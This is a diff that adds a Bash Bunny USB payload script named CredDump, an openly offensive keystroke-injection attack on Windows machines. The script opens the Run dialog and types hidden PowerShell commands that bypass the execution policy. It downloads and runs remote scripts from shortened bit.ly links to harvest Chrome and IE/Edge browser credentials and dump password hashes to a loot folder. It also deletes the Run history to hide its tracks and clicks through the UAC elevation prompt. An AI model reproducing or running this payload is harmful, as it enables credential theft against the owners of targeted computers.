@@ -1,0 +1,91 @@
+﻿#!/bin/bash
+
+# Title:         CredDump
+# Author:        DBA
+# Version:       1.0
+#
+# Downloads a Collector Powershellscript from Internet and execute it. 
+# Stores the Information an Loot directory on Stick
+# Collects Browser Creds form Chrome, IE/Edge 
+#
+# Put a lot of stuff into powershell script
+# 
+# Credits to these guys for their powershell scripts:
+# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
+# https://github.com/EmpireProject/Empire    Get-FoxDump, Invoke-PowerDump 
+# illwill for BrowserCreds script which gave me the idea for this stuff
+#
+# White Blinking.....Comming up
+# Purple ............Setup
+# Amber Blinking.....Scanning
+# Green..............Finished
+
+
+# Set LED to CommingUP an set attack mode
+#
+LED R G B
+
+ATTACKMODE HID STORAGE
+
+#Some variables
+#
+# loot dir on bunny (will be create with on downloaded Powershell script)
+UX_LOOTDIR="/root/udisk/loot/DumpCreds"
+WIN_LOOTDIR=$(echo $UX_LOOTDIR |sed 's/\/root\/udisk//;s/\//\\/g') # rmove string "/root/udisk" and changes / to \\ for Windows compatibility
+	
+
+
+# Some bash functions
+#
+
+# FUNCTION: wait_LED
+#
+# Waits for LED.TXT file and set LED
+# usage: wait_file [timeout] 
+#
+
+
+LED R B 200
+
+	
+# Wait for Windows to mount storage
+Q DELAY 2000
+	
+# Start with main script
+LED R G 200
+
+#SET QUACK Language
+Q SET_LANGUAGE DE
+
+
+# run powershell as admin because of Invoke-PowerDump function
+Q GUI r
+Q DELAY 750
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c  IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2nj3K39\'\)\; _main_ -LOOTDIR \"$WIN_LOOTDIR\" -APPEND \"false\"
+Q DELAY 200
+Q ENTER
+
+# Wait for script has finished
+LED R B 200
+Q DELAY 4000
+LED R G 200
+
+
+# Launch powershell as admin and deletes Run history
+Q GUI r
+Q DELAY 750
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f' -Verb runAs"
+Q ENTER
+
+# Bypass UAC
+Q DELAY 750
+Q ALT j
+Q DELAY 750
+
+Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/bit.ly\/2n6ja8t\'\)\; _main_ -LOOTDIR \"$WIN_LOOTDIR\" -APPEND \"true\"
+Q DELAY 200
+Q ENTER
+Q DELAY 700
+
+sync
+LED G
